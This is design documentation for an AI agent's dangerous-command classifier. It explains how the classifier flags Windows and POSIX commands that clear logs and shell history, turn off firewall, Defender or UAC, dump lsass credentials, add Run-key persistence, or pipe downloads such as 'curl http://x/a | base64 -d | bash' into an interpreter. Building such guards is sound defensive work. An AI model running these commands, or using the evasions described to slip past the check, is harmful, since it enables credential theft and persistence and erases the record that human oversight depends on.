`isShellHistoryPath` (`packages/agent/src/dangerous-command.ts:3489`) recognizes the two real spellings: the literal `ConsoleHost_history.txt` that PSReadLine writes, and the `(Get-PSReadLineOption).HistorySavePath` expression that reads where it is. The literal is matched inside the longer string and not as a path, because it arrives glued to a longer path. `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` is the usual spelling. A whole-path match needs the prefix to be spelled one way.

A `Disable*` or `No*` parameter is the act whatever the cmdlet is. It is read so the message says what was done rather than which cmdlet did it. The two examples this comment used to cite do not exist. `Set-NetFirewallProfile` has no `-NoLockdown`, and `Set-LocalUser` has no `-NoPassword`, both measured against the real cmdlets. The real ones sit on other cmdlets in the same table: `New-LocalUser -NoPassword` clears the password, `Clear-Disk -RemoveData` empties the disk, and `Disable-WindowsOptionalFeature -Remove` unregisters the feature. A `Set-*` cmdlet with no `Disable*` or `No*` parameter is *not* made safe by this, because it falls to the name rule. That is the deliberate choice: `-DefaultInboundAction Block` is not a parameter of that kind, and to tighten a profile is as likely as to loosen it. So no read of the parameters here earns a rule of its own.

The session's own history file is reached three ways: `Clear-Content`, `Remove-Item`, `Clear-History` and `Remove-History` where the segment names a history path. The last two also count with no path, because they clear the in-memory history. None of these is a `POWERSHELL_ADMIN_CMDLETS` entry, because none is destructive to anything but a record. `Clear-Content` on a config file is ordinary work, and `Remove-Item` is already caught by the force-delete rule wherever it appears. What makes them worth a name is the target, and the message says so. The history file is the record of what ran, and to clear it removes that record.

`POWERSHELL_ADMIN_CMDLETS` (`packages/agent/src/dangerous-command.ts:3538`) is the gap this group closes, and the gap is a fact rather than a matter of taste. `wevtutil cl Security` and `Clear-EventLog -LogName Security` empty the same log, and the PowerShell spelling used to be `null`. `wevtutil cl`, `netsh advfirewall set`, `schtasks /create`, `diskpart` and `sc config` are all rules above, and each has a PowerShell twin that was not.

The table was measured by `Get-Command` on this machine, which is why the list is what it is. Thirty-four of the thirty-five entries resolve to a Cmdlet or Function, and the one that does not is noted at its own row. The count was re-measured rather than transcribed. A claim that "every one was confirmed to resolve" was false in this file once before, at `set-autologon` below. `Remove-Disk`, the cmdlet the table was once written with, does not exist at all. A check that fails is what makes the rest of the list mean something. `Get-Command` also reports many of these as *Functions* rather than *Cmdlets* on this box. That is why the rule reads the name and not the command type.

It was not measured that any of them destroys anything, on purpose. `Clear-Disk` with `-RemoveData` can erase a volume, `Clear-EventLog` empties a log, and `Set-NetFirewallProfile -Enabled False` turns the firewall off. None of the three was run in its destructive form.

The rows are listed one per act rather than by verb, and the reason is the read-only twins. A verb set is right for `netsh`, where `add` and `delete` mean the same thing across every noun, and it is wrong here. `Set-NetFirewallProfile` is a rule because of what it changes. `Get-NetFirewallProfile` is the read-only half of the same module and is not, and the only thing that tells them apart is the name. Each entry names the cmdlet and the act. A cmdlet with a harmless twin is excluded by measurement rather than by a rule that fires on both. The read-only twins, `Get-NetFirewallRule` and `Get-WmiObject`, are the reason this is not a verb rule. They are not in the table and never were.

`set-executionpolicy` is deliberately **not** in the table. It looks like a member, because it is the PowerShell way to weaken script checks. But it is already covered by a rule that reads the policy *value*, and that rule is the better one. Only three of the seven policies weaken anything, and `RemoteSigned`, `AllSigned` and `Restricted` all make the machine stricter. An entry here fires on the strictest policies there are, which is the exact failure this file is written to avoid. `Clear-Content` and `Set-Content` are out for the same kind of reason. `Set-Content` is how a config file is written in every script ever written, and a rule on it fires on ordinary work. `Clear-Content` aimed at a history file is the exception, caught by the narrower rule above.

The nine `Disable-*` rows are not a rule on the name, and the reason is measured rather than argued. This machine resolves **118** distinct `Disable-*` cmdlets, and nine of them weaken anything. A blanket `Disable-*` rule fires on `Disable-PSRemoting`, `Disable-PSBreakpoint` and `Disable-RunspaceDebug`, all of which *reduce* attack surface. It fires on all forty-two `Disable-Azure*` cmdlets too, which act on a cloud subscription rather than on this machine.

The trap that made this worth a measurement is `Disable-SmbDelegation`: the name reads like a boundary cmdlet and the code is the opposite. Its own definition, read with `Get-Command`, builds `$delegationPrinciples` from the accounts allowed to act on the server's behalf and then calls `Set-ADComputer -PrincipalsAllowedToDelegateToAccount $delegationPrinciples`. To supply `-SmbClient` writes that list back minus the one named, and to omit it skips the accumulation entirely. So the list it writes back is the empty one it started with, and every delegation grant is cleared. The write is real, and it is still not this table's business. Two reasons apply, and they are facts about the cmdlet and not about its name. It writes to `Get-ADComputer`'s view of a **directory object on another host**. The premise of every row here is that the command weakens *this* machine. And it removes delegation, the standard move to harden a domain. SMB delegation is the classic route from a domain credential to a privileged ticket, and to clear it takes capability away rather than gives it. A rule that flagged it trains a user to dismiss the table. What it covers is one Active Directory write from a machine that is not the target.

The service and account rows are the `sc` and `net` twins spelled the PowerShell way: `new-service`, `set-service`, `new-localuser`, `remove-localuser`, `new-localgroup` and `add-localgroupmember`. That is a coincidence, and not a rule about membership.

`set-localuser` changes a local account, and the password is part of that. `set-autologon` is the one entry `Get-Command` did not resolve on the machine it was measured on. It belongs to a third-party module (`Autologon`) and not to the box. The comment above the table used to say "every one was confirmed to resolve", which was false of this row.

`start-scheduledtask` completes the set beside `register-`, `unregister-` and `disable-scheduledtask`. Those three change what a task *is*, and this one is the only member of the family that makes it *run*. To run a registered task is arbitrary code under another name, and it was the last quarter of a family the file already covers. It sits with three more measured `null`s: `schtasks /run`, `icacls /grant` and `reg delete /f` are each classified above. And `start-scheduledtask`, `set-acl`, `remove-itemproperty` and `clear-itemproperty` are the same three acts spelled the PowerShell way, plus the fourth that has no `reg` counterpart at all. `Get-Acl` stays out as the read-only twin of `set-acl`. `Remove-Item` is already in `DELETE_CMDLETS`, and `Remove-Item -Recurse -Force` against a registry path matches today only because of `-Force`. `remove-itemproperty` and `clear-itemproperty` name no verb at all, so the deletion is the whole of what they do. There is no harmless read of either. The absence of `Get-ItemProperty` and `Clear-Content` is the same call in the other direction.

`POWERSHELL_DISABLING_PARAMETERS` (`packages/agent/src/dangerous-command.ts:3603`) holds the nine parameters that disable something as data. They sit next to the function rather than inside it. A set is a thing this file measures and a regex is a thing it guesses. The whole reason `isDisablingParameter` is not a regex any more is a `Get-Command` run over 633 parameters.

`isDisablingParameter` (`packages/agent/src/dangerous-command.ts:3623`) measured three tries at a boundary, and all three were wrong. The first, `(?:$|[-:0-9])` after the stem, matches none of the 633 parameters. Every real one goes on with a letter: dead and green, the state a private function nobody tests reaches. The second, `(?![a-z])` on a raw token, reads the case, which is the only thing that tells `-RemoveData` from `-Removedata`. But `/i` makes the lookahead case-insensitive too, so `D` is rejected and two of 633 match. The third, the same without `/i` against a lowercased token, fails the other way. The lowercase step already turned `D` into `d`, and two of 633 match in the opposite direction. The third try is also not available in principle: the caller segments `windowsSegments(lower)`, so every token arrives lowercased. The case a case-boundary needs is gone before the function is called. So there is no boundary to be had, and a table is the honest shape: 633 parameters scanned across the twenty-five cmdlets that resolve. Eleven of them carry one of the five stems, and nine of them actually disable something. The nine: `-Disabled` on `New-LocalUser` (the account cannot log on). `-NoPassword` on `New-LocalUser` (no password). `-RemoveData` on `Clear-Disk` (the volume's contents). `-RemoveOEM` on `Clear-Disk` (the OEM partition). `-Remove` on `Disable-WindowsOptionalFeature` (the feature registration). `-NoRestart` on `Disable-WindowsOptionalFeature` (the reboot, so the removal is half done). `-DisableHeatGathering` on `Format-Volume` (the wear leveller). `-NoTrim` on `Format-Volume` (TRIM). And `-ClearCentralAccessPolicy` on `Set-Acl` (the central access policy on the file). The two the stems caught wrongly are `-NotifyOnListen` on `Set-NetFirewallProfile`, which asks it to *report* traffic, and `-DisabledInterfaceAliases` on the same cmdlet. The second is an interface alias *name* and a string. `Set-LocalUser` has no stem parameter at all, measured: it takes `-Password` where `New-LocalUser` takes `-NoPassword`. A comment in this file used to cite `Set-LocalUser -NoPassword` as an example of a real parameter.

What this gives up is stated rather than hidden. A parameter that disables something is not read on a cmdlet that is not on this box. The same holds on a Windows version this box does not have. To add one means a `Get-Command` run behind it, which is the only way the list can be trusted at all. The bare-stem arm, meant to cover that case, was cut, and its failure is the reason. The claim: "no measured parameter is spelled exactly `-Remove`, so to match the bare stems costs nothing here". That was measured, and true of the *parameters*, and irrelevant, because the function cannot tell a parameter from an argument. `Set-NetFirewallProfile -DefaultInboundAction Block` ends with a token that is exactly `Block`, and it matched. The caller's own comment says that line does not disable anything, and it is right. So the arm was wrong and the table stands alone. The value is not consulted, for the reason the Defender rule gives: to read it means three spellings and an absent case. And absent means "use the default", which for a parameter named `Disable*` is the one that disables.

`verbMatches` (`packages/agent/src/dangerous-command.ts:3629`) answers whether an argument names a known verb. A bare word matches exactly, and a switch matches as a prefix with a boundary. `cipher /w:C` is `/w` with a volume attached, but `bcdedit /setup` is not `/set`. The boundary is what tells those apart. A switch matches when the rest is empty or does not start with a letter or a digit.

### Windows: the administrative programs and their tables

`WINDOWS_ADMIN_VERBS` (`packages/agent/src/dangerous-command.ts:3496`) is a program plus a verb rather than a program, because almost none of these programs is dangerous in *every* form. Every program named here except two exists on this machine under the spelling the rule matches, and accepts the switch form written against it. The same command without either switch left `a.txt` *and* `extra.txt`. The deletion is what those two switches add and not a side effect of the copy.

`WINDOWS_ADMIN_ALWAYS` (`packages/agent/src/dangerous-command.ts:3528`) is where the program name is the whole story. `format` reformats a volume whatever it is told, `diskpart` is a disk partition tool whatever it is pointed at. `WINDOWS_SHUTDOWN_SWITCHES` (`packages/agent/src/dangerous-command.ts:3640`) was read out of `shutdown /?` on this box. `/s`, `/sg` and `/g` shut the machine down, `/r` restarts it, `/p` and `/h` power it off and hibernate it. `/hybrid` closes the lid's way, and `/fw` boots straight into firmware. `/i`, `/l`, `/a`, `/e`, `/o` and `/?` are left out, and `/a` most of all, because it is the undo.

`CACLS_WRITE_SWITCHES` (`packages/agent/src/dangerous-command.ts:3643`) is `/g`, `/r`, `/p` and `/d`, and `dangerousCacls` (`packages/agent/src/dangerous-command.ts:3647`) is the `cacls` reader, the deprecated twin of `icacls`, which is already a rule. Measured from `cacls /?`, which prints the syntax block `CACLS filename [/T] [/M] [/L] [/S[:SDDL]] [/E] [/C] [/G user:perm] [/R user [...]] [/P user:perm [...]] [/D user [...]]`. `/G` grants, `/R` revokes, `/P` replaces a user's rights, `/D` denies, and `/S:SDDL` replaces the whole ACL with a string. `/T`, `/M`, `/L` and `/C` are modifiers: they change *how* the ACL is read or written and are never the write itself. A bare `/S` prints the DACL as SDDL, so a bare `cacls C:\x` only reads and stays quiet. That is the half of this program a person runs to look at a machine. `/S:` is read as a prefix rather than put in the table, because it carries its argument in the same token. `dangerousFsutil` (`packages/agent/src/dangerous-command.ts:3663`) reads a grammar of `<group> <command>`, so its destructive commands are three or four words deep rather than one switch deep. Nothing was run in either form. The second form is claimed from the usage line's own example, `fsutil file setEOF C:\testfile.txt 1000`. The first is claimed from what an end-of-file marker at zero is. The length is the fifth word and not the fourth, `tokens[4]`, and the test is `/^-?0+$/`. `fsutil usn deleteJournal <flags> <volume>` was measured the same way: the usage line prints `<Flags>` as `/D : Delete` and `/N : Notify`, with `Eg : usn deleteJournal /D C:`. `/C` is not a flag of this command, and an audit of this file handed `/c` as the spelling to match. The subcommand guard is not held by any test, and the driver says so. `dangerousManageBde` (`packages/agent/src/dangerous-command.ts:3690`) turns a drive's disk encryption off. `dangerousWindowsAdmin` (`packages/agent/src/dangerous-command.ts:3736`) applies the four tables and the five single-program readers. The four programs `fsutil`, `cacls`, `manage-bde` and `wbadmin` are *not* in the verb table. Each needs its own read rather than a set of switch names. Their branch sits above the `verbs === undefined` return so they can reach it. A verb set is right for `netsh`, where `add` and `delete` mean the same thing across every noun. It is wrong for `fsutil`, whose `deleteJournal` is a two-word subcommand and whose `file setEOF` is three.

Four rows read NULL against a rule that was plainly in the file. The switches are the whole grammar of the program, and `shutdown /?` printed them. The prose around them came back in the console's own code page and was unreadable. To log off ends the session but the machine is still up and the user logs straight back in. That is a different act from to put the machine away.

`procdump` and `procdump64` are read against one process name, `lsass`. Any target of `procdump` is a memory dump. The one target that turns it into a credential theft rather than a diagnostic artifact is `lsass`. That is the process the Local Security Authority runs in, and its memory is where Windows keeps the logon credentials. The rule is narrow to that name on purpose: `procdump -ma notepad.exe x.dmp` is what the tool is for, and to flag it is to flag its documentation. `procdump` also has `-h` (hang) and `-c` (clamp) modes that are process management and not a dump at all. A whole-program rule sweeps those in with the real dumps. This branch sits above the verb lookup for the same reason `shutdown` does. `procdump` has no verb to recognize, because the switch that makes it dump is `-ma`, and `-h` and `-c` are not dumps. So the early return takes the branch out of reach entirely. Every argument is scanned for the name and not a fixed position, because the switch comes first: `procdump -ma lsass.exe dump.dmp`. The `.exe` is optional in the match. `procdump64` is the same program under the name its 64-bit build ships with. `executableName` does not fold that name into `procdump`, so the rule names it here. A 64-bit Windows that runs the 64-bit build is the ordinary case rather than the exotic one. It was not measured, because to measure it means to dump a live process's memory. That is the act rather than a harmless sample of it.

The DLL retry is the next block. `executableName` strips `.exe`, `.cmd`, `.bat` and `.com` and **not** `.dll`. So `C:\Windows\System32\comsvcs.dll` reaches this function as the program `comsvcs.dll` and misses the `comsvcs` entry by one suffix. The DLL is the same act the entry already names, reached by the spelling the machine's own file has. The retry is bounded to this table and to a name that ends in `.dll`. The other choice, a change to `executableName` about `.dll`, changes what *every* Windows rule in the file reads as a program name. And a DLL base name that collides with an `.exe` rule is the kind of collision an incident finds rather than a test. Here the fallback can only ever reach an entry that was already written for that DLL.

`rundll32 <dll>, <Export>` is the same act reached by a spelling that never names the program at all. The DLL is an argument and the export is the verb. This is the documented way to run `comsvcs.dll`'s `MiniDump`, a process's memory written to a file. It was `null` while `comsvcs MiniDump` was flagged, which is the wrong way round, because the carrier is the spelling a person actually types. The match is bounded to the exports this file has already named. `rundll32` runs arbitrary code from any DLL, so a whole-program rule catches everything. That is the shape its own neighbour argues against, the same case the `reg add` branch makes. And `rundll32 shell32.dll,ShellExecuteA calc.exe` is what most of its legitimate use looks like. What is matched is a DLL this file has an entry for, called with a verb that entry has. So the table stays the single place a dangerous Windows export is written down. `comsvcs.dll,MiniDump` is one token and `comsvcs.dll, MiniDump` is two, and the rest of either is the export. This block sits above the verb lookup for the same reason `shutdown` and `procdump` do: `rundll32` has no entry of its own.

After all of that, the verb lookup runs, with a fallback for a `.dll` name. Every argument is looked at rather than only the first, because `sc config` puts its verb first and `netsh advfirewall set allprofiles state off` puts it third. These programs have no shared shape to read the verb out of. The message is `program known`, which destroys machine state.

The other `net` nouns that destroy something are handled by name. `net /?` on this machine prints the whole verb list, `ACCOUNTS | COMPUTER | CONFIG | ... | SHARE | START | STATISTICS | STOP | TIME | USE | USER | VIEW`. And three of those nouns have a destructive form that carries no switch this loop reads. `stop` is `sc stop` under another name, and `sc stop` is already a rule above. `net share <name> /DELETE` and `net localgroup <name> /DELETE` were measured from `net share /?`, which prints `{sharename | devicename | drive:path} /DELETE` and `sharename \\computername /DELETE`. The noun is read rather than matched as a switch, because a bareword verb set fires on `net share stop C:\x`, a share *named* `stop`. The second token is what makes these three commands, and to read it cannot confuse a name for a verb. `net stop` with no name is a usage error and not an act, and `net stop /?` prints the syntax. So a third word is what makes it a command.

`net user <name> <password>` resets a password and carries no `/add` to recognize it by. It is exactly four words, `net`, `user`, the name and the password, and the two listings beside it are two and three words. `net user /?` on this machine also prints `username [/DELETE]`, which is the same four words. The rule used to report that as a password reset, which is the opposite of what it does. `/delete` removes the account. The act was flagged either way. But a message that names the wrong act is worse than no message, because the user reads it and learns nothing. So the fourth word is read. `/delete` is named as the account deletion. Every other option (`/TIMES:`, `/ACTIVE:`, `/COMMENT:`, `/EXPIRES:`, `/DOMAIN`, all printed by `net user /?`) is "changes that account's settings", and anything else is the password reset. `/add` is not read here because it cannot reach this line. The verb scan above matches `/add` on any argument and returns first, so `net user bob /add` reports `net /add`. An arm for it is dead code that reads as coverage.

`reg add` is the other way to get a program to run at every startup. It is the same shape of act as to write the value with PowerShell. Unlike the PowerShell rule it has to be narrow. `reg add` is ordinary maintenance for the whole rest of the registry, and a rule that caught all of it flags ordinary setup work. Only the Run key is flagged. `EnableLUA` is the UAC prompt's own switch, and both halves are required and neither is enough. The value names what is changed, and the path is what makes `EnableLUA` under `Policies\System` the UAC switch rather than an unrelated name. `reg add` on the same key is the CMD spelling of that same act, and `reg delete` of that value above is a rule too. To leave `add` out made the coverage depend on which shell is used. The Defender row is the same shape one level over. `Set-MpPreference -DisableRealtimeMonitoring $true` is already a rule by way of its parameter name, and the registry key that setting writes is `...\Windows Defender\Real-Time Protection`. Before this row, `reg add` against either key was `null`, while the PowerShell spelling of that same act was not. The service row is the registry spelling of `sc config <name> start= disabled`, which is a rule in this file. The same act has the same reasons, and the other spelling was the one already covered.

`reg import` is the one write whose content cannot be read off the command line. The measured usage is whole: `REG IMPORT FileName[/reg:32 | /reg:64]`. There is no key, no value name and no switch to check. So a rule here is a rule on the file rather than on what the file says. And a `.reg` file can carry the Run key and the Defender policy above along with everything else. The two verbs next to it are deliberately *not* treated the same way. `reg save` and `reg export` are narrow, because the danger is the *target* hive and the target is on the command line. `reg restore` is in the verb table above for the same reason, because it names its key. `reg import` names none. The `reg save` and `reg export` target read produces the message `"which writes a copy of a registry hive holding account credentials"`. It lives here rather than in the table, because the `reg add` branch above reads its target the same way. The two belong together.

### Pipelines, downloads and interpreters

This group answers one question the other rules cannot: what happens when a download becomes program text.

`NETWORK_FETCH_PROGRAMS` (`packages/agent/src/dangerous-command.ts:3920`) holds `curl` and `wget`, and only those two. The rule is about a program text that arrived from somewhere else and went straight to an interpreter. A local producer is not the shape. `cat notes.txt | grep x` and `cat x | sh` are both ordinary. To flag the second just because it shares a pipe with the first is how a classifier teaches a user to switch it off.

`SCRIPT_INTERPRETERS` (`packages/agent/src/dangerous-command.ts:3924`) holds `sh`, `bash`, `dash`, `ksh`, `zsh`, `python`, `python3`, `node` and `perl`. Each of `sh`, `bash`, `dash`, `python`, `python3`, `node` and `perl` was piped a script on this machine, and each one read it and ran it. `zsh` and `ksh` stand on the same grounds: they are shells, and `zsh` is the default login shell on macOS. So a list without it has a hole on the platform where it matters most. Neither is installed here, so neither was measured. `ruby` was not measured either and is left out rather than assumed.

`segmentProgram` (`packages/agent/src/dangerous-command.ts:3928`) reports what one segment actually runs, past the shell-wrapper text and past the wrappers themselves. The platform parameter defaults to `posix`, because the pipe rule is the original caller and is POSIX-only. The credential exfiltration rule passes `windows` explicitly, and it has to. `executableName` strips `.exe` on the Windows branch and not on the POSIX one, so a sender spelled `curl.exe` reads as `curl.exe` and matches nothing. That spelling is how a PowerShell line names it, because the `curl.exe` on the path is the one a person runs.

The walk repeats the three lookups `matchTokens` uses. A wrapper whose operand or query options differ has to be unwrapped the same way here, or `curl … | timeout 5 bash` names the program `5`. `sudo` is named separately because it is not in `COMMAND_PREFIX_PROGRAMS`. It is a wrapper, but it has its own branch in `matchTokens` rather than a place on the list. So a loop that reads only the list walks straight past it. `curl … | sudo bash` still reads stdin, so the program that receives the download is `bash` and not `sudo`. The hop loop stops at `MAX_DANGEROUS_COMMAND_WRAPPER_DEPTH`, the same bound the other wrapper reads use.

`PIPE_FORWARDING_PROGRAMS` (`packages/agent/src/dangerous-command.ts:3959`) is a whitelist, and it has to be one. There is no way to tell from a command line whether an arbitrary program forwards its stdin. A rule that walked every stage in between walks on an assumption. And `curl … | some-binary | bash` prompts on a guess. Each entry emits a stream built from the stream it read. So bytes fetched from the network still reach the interpreter after a pass through it.

None of these programs was run on this machine, which has no POSIX userland to run them in. They are named from what each one does, the same basis as the `wmic` entry elsewhere in this file. That these programs do not run here is a fact about this machine and not a reason to leave the act uncovered.

The set is grouped by what each member does to the bytes:

- Pass-through: `cat` and `tee` emit the input unchanged, so a chain through them is the same chain without them.
- Decode: `base64`, `openssl`, `uudecode`, `xxd` and `iconv` turn bytes into the program text an interpreter wants. This is the group the rule is really about. It is the step that turns a download nobody can read into text that looks like anything at all.
- Decompress: the `gzip`, `bzip2`, `xz`, `lzma`, `zstd` and `uncompress` families reach the same place by a different door. The members are `bzip2`, `bunzip2`, `bzcat`, `compress`, `gzip`, `gunzip`, `lzcat`, `lzma`, `pigz`, `uncompress`, `unxz`, `xz`, `xzcat`, `zcat`, `zlib-flate`, `zstd`, `zstdcat` and `unzstd`.
- Mangle and filter: line and character transforms obscure the payload without a decode. The members are `awk`, `column`, `cut`, `dos2unix`, `egrep`, `expand`, `fold`, `fgrep`, `gawk`, `grep` and `head`. The other names are `jq`, `less`, `more`, `nl`, `rev`, `sed`, `sort`, `strings`, `tail`, `tr`, `uniq` and `yq`. They are the programs that also appear in ordinary pipelines, and each one still emits a stream.

`fetchOutputTargets` (`packages/agent/src/dangerous-command.ts:4016`) reads the files `curl` or `wget` was told to write the download into. Five spellings of the same two switches are real. All five measured `null` against a first version that handled only the bare form. The five are `-o FILE`, `-oFILE`, `--output FILE`, `--output=FILE` and `-so FILE` with the flag bundled among others. wget adds `--output-document` and its own uppercase `-O`. curl's uppercase `-O` is not read, because it derives the filename from the URL instead of a given name. wget's lowercase `-o` is not read either, because it names a log file and does not write the download at all. Two mistakes are available here: to miss every wget download, or to refuse every wget that logs.

The reader is shared by `posixStartupWrite` and `downloadedFileThenRun` for the reason `ddOutputTargets` is shared by the disk rule and the startup rule. The same option that reaches two questions is one reader. The program is derived here again rather than taken as an argument, because the two callers hold different things. One holds tokens and one holds a script, and neither of those is the program name.

A target of `-` is a real answer and this function returns it. `wget -O-` writes to stdout, which is the pipe `fetchPipedIntoInterpreter` covers. The caller drops that value and this reader keeps it. The fact that a command wrote to stdout is a fact about the command, and not a judgment this reader makes.

The parse reads the glued long form before the bare long form, and the glued short form is greedy. So `-soFILE` resolves through the backtrack to `-s -o FILE` rather than a read of the `o` inside some other flag name. A bare short flag bundled with others takes the next argument. Quotes are stripped from both ends.

`downloadedFileThenRun` (`packages/agent/src/dangerous-command.ts:4052`) reads a download written to a file and a later command that runs that same file. The comment on `fetchPipedIntoInterpreter` names this shape as one a pipeline walk can never see. It was right about the pipeline and wrong about the shape. `curl -o /tmp/x ; bash /tmp/x` downloads to a file and then runs it, and a walk over separators finds nothing. No bytes move between the two commands at all. The rule earns its place for the same reason the pipe rule does. The program text was never on the command line, and nothing in this repository can read it. The interpreter runs it before a user has anywhere to look.

The two halves have to be joined by name, and both have to be present. A `curl -o` with no interpreter after it is a download, which is ordinary and is left alone. An interpreter with no download before it is a person who runs a script they already have. That is the control the pipe rule states in its own comment. The name has to be the same name in both places. A download to `/tmp/x` and a `bash /tmp/y` is two unrelated commands. And a match on some interpreter somewhere later on the line is the shape this file refuses everywhere else.

`;`, `&&` and a newline qualify, because all three are a person who says "and then". `||` does not, for the same reason it is not a pipe in `fetchPipedIntoInterpreter`: it means the second command runs instead. `|` is excluded for a second reason, because a fetch piped into an interpreter is the other function's job. And a `curl -o` next to a pipe is a contradiction rather than a shape.

The rule is not measured, and there is nothing here to measure on this machine. It is about two command lines a shell reads, and both halves are read as text.

`fetchPipedIntoInterpreter` (`packages/agent/src/dangerous-command.ts:4078`) is about the pipe rather than either end. Neither `curl` nor `sh` is dangerous alone, and a rule for each separately is two rules that fire on ordinary commands. What makes this one worth a prompt is that the text was never on the command line. Nothing else in the repository can read it, and the interpreter runs it before any file is written where a user can look.

It follows the chain, not the pair. An earlier version asked only about two adjacent segments, and one stage in between made the rule trivially evadable: `curl http://x/a | base64 -d | bash` answered `null` while `curl http://x/a | bash` matched. The decoder hop is not a weaker version of the act. It is the version that produces bytes no one can read even by a look at the download. So the walk starts at a fetcher, steps over any number of `PIPE_FORWARDING_PROGRAMS`, and reports the first interpreter it lands on.

Only `|` keeps the chain. That is why the walk needs the separators rather than the segments. `curl … ; base64 -d ; bash` runs three unrelated commands and moves no bytes between them. A treatment of that line as a chain is a rule that fires on the wrong thing. `&&`, `||`, `;`, `&` and a newline all end the walk, and so does any stage not named in the set.

Redirections are not modelled, and the sentence an earlier version of the source comment wrote about them was false. It claimed a stage that redirects ends the walk, on the grounds that `curl … | base64 -d > /tmp/x` sends nothing to a later command. The walk reads operators and program names only, so it does not. `curl … | base64 -d > /tmp/x | bash` matches, and in that command `bash` reads an empty pipe and cannot run anything. To leave it is deliberate. A proper decision means to tell "still writes its stdout" apart from "sends it to a file". The two cases: `tee f` writes both, `> f` writes only the file, and `2>` is not stdout at all. The only shape where the answer changes the match is a pipeline that cannot run anything, which is a false positive nobody types. The shape that is worth a rule has no pipe in it and is not this one. `curl -o /tmp/x ; bash /tmp/x` downloads to a file and then runs it, and no walk of a pipeline chain sees that.

Measured on this machine: `cat payload.sh | sh` and `| bash` both ran the script, and so did a pipe into each interpreter named above. That is why the rule is about the pipe and not about either program.

### Shell history and record destruction

`historyRules` (`packages/agent/src/dangerous-command.ts:4444`) reads a command that turns shell history off. The commands above one in a transcript are the record of what the agent did, and two spellings stop new entries. Both were measured with the history file pre-seeded with one line. That way a file that kept nothing new is distinguishable from a file that was emptied. And `set -o history` was forced on first, because a non-interactive shell never creates a HISTFILE at all. Every row reads zero otherwise.

- Baseline (no variant line at all): `4` lines, the seed plus three. Every other number is compared against this row, and every variant ran the same script byte for byte with exactly one line swapped. The first try at this measurement gave each row a different script, so the counts were not comparable to each other.
- `unset HISTFILE`: `1` line, the seed, still intact. Nothing was erased. The three commands were simply not recorded.
- `set +o history`: `1` line, the same.
- `export HISTFILE=/dev/null` and `export HISTFILE=`: `1` line each, the same. The writes go to `/dev/null`, which is where the measured `1` line comes from. Those two are caught by `historyAssignmentRule` and not by this function.

The near neighbours below are measured non-actions and are deliberately absent from this function. Most read `5` lines against the baseline's `4`. The extra line is the variant line itself, recorded like any other command. The one exception says so where it appears, because a header that claimed all of them read `5` is contradicted by the `history -c` row.

- `set +oh`, `set +history`, `set +h`, `set +O history`, `set +O` and `set +o hist`: short flags do not combine for `set` here, and the capital `O` is a different thing again. This was tried on the grounds that short flags combine the way `git clean -fn` does. They do not, and an earlier version of the `set` branch accepted the cluster until this measurement. `set +history` and `set +O history` are two different spellings and both were run. The doc named one and the test row named the other, so neither spelling can be taken to stand for both. They agree, and both read `5`.
- `set +o historyx`, which names no option.
- `history -c`: `4` lines, exactly the baseline, with the seed intact. It clears an in-memory list and not the file. So it neither suppresses the next three commands nor removes the record of the ones before it.
- `unset HISTSIZE`: `5` lines, appends like a baseline.
- `set -o history`: the opposite of the rule.
- `env HISTFILE=/dev/null true` and a bare `HISTFILE=/dev/null true`: both `5`. A per-process variable on a command that exits does not outlive it, so there is no suppression to record. The assignment spelling that does suppress is the one `historyAssignmentRule` reads.

A fourth builtin spelling group was here and is gone: `export HISTFILE`, `readonly HISTFILE`, `declare -x HISTFILE` and `typeset HISTFILE`, the forms with no `=` at all. Each measured `5` lines, the same as the non-actions. With HISTFILE already set, `export HISTFILE` re-exports the value it has and changes nothing. Only the `=` spellings suppress, and those reach `historyAssignmentRule`, which is a strict superset of the branch that was deleted. So the branch was unreachable for everything it was built to catch.

In the `set` branch, `set +o history` is the fourth spelling measured to suppress, and `set -o history` turns the record on and is left alone. That is why the sign is read rather than the pair. The `unset` branch reads `unset HISTFILE HISTFILESIZE`, which unsets both, and only the first is this rule. The second is ordinary and is not named.

`historyAssignmentRule` (`packages/agent/src/dangerous-command.ts:4468`) is the same rule for the assignment spelling, where there is no program to read. `HISTFILE=/dev/null bash` and `HISTFILE= bash -c '…'` have no `unset` in them at all, and `stripLeadingAssignments` inside `matchTokens` removes the token before any rule can see it. So this rule reads the raw segment text for the one shape the others cannot reach. It is deliberately narrow: HISTFILE followed by `=` and either nothing or `/dev/null`. A line that only mentions the variable, such as `echo $HISTFILE` or `ls "$HISTFILE"`, has no `=` after it here and is left alone, which is checked.

What is measured here and what is not: an assignment prefix binds for the one command it is attached to. So the only way to see whether it suppresses is to look at what that child recorded. Measured: `HISTFILE=/dev/null true` and `env HISTFILE=/dev/null true` each wrote `5` lines, against the `4` of a control that has no variant line at all. So in the non-interactive shell this is a no-op, exactly like `set +oh`. The three commands are still recorded, because the child they name records everything whatever file it was given.

The one case nothing here can measure is the case the rule exists for. An interactive child genuinely stops its record when its HISTFILE points at `/dev/null`, and that is the whole argument for the rule. But an interactive bash needs a terminal, and this machine has no `script` to allocate one. A bash fed from a pipe is not interactive for history purposes. Given a real HISTFILE it recorded nothing either, so that try's positive control failed and its answer is void rather than negative.

So the rule stays for the interactive child, it is measured to do nothing in the non-interactive one, and the test rows say exactly that. What is not claimed is that this changes anything for the non-interactive commands an agent actually runs. It does not.

`historyRules` and `historyAssignmentRule` turn the shell history off. `posixRecordDestruction` (`packages/agent/src/dangerous-command.ts:4198`) covers the other half, because neither of the other two touches a record that already exists. `> ~/.bash_history` and `truncate -s 0 ~/.bash_history` are the same act the Windows half was just given a rule for, and both were `null`.

The line is what makes this a rule, not the program. `truncate` is how a build shrinks an image and `cat > file` is how every file in this repository was written. So neither the program nor the verb is the shape. A log or history file is. That is the same distinction the `WINDOWS_ADMIN_VERBS` table draws. A verb set for the programs that have nothing else to do, and a target test for the programs that do everything.

Measured on this machine, and only on this machine. `truncate -s 0` on a three-line file left `0` bytes. The control is the same command with a nonzero size, which left the first two bytes intact. So the rule reads the size, and that value is what tells `-s 0` apart from `-s 40`. The redirect needs no measurement to be clear: `>` truncates its target before it writes, which makes `echo x > f` destructive and `echo x >> f` not.

Not covered here, and why: `journalctl --vacuum-time` and `logrotate` are not rules. Both are absent from this machine (`command -v` finds neither), and unlike `ufw disable` they are not commands whose effect is to switch a protection off. `POSIX_PROTECTION_OFF` now covers `ufw disable`, on the `wmic` precedent. That a tool is not installed here is a fact about this machine, and not a reason to leave the act uncovered. `logrotate` manages rotation policy and `--vacuum-time` trims archived journals. To empty them removes old records, which is weaker than to remove the ability to record at all.

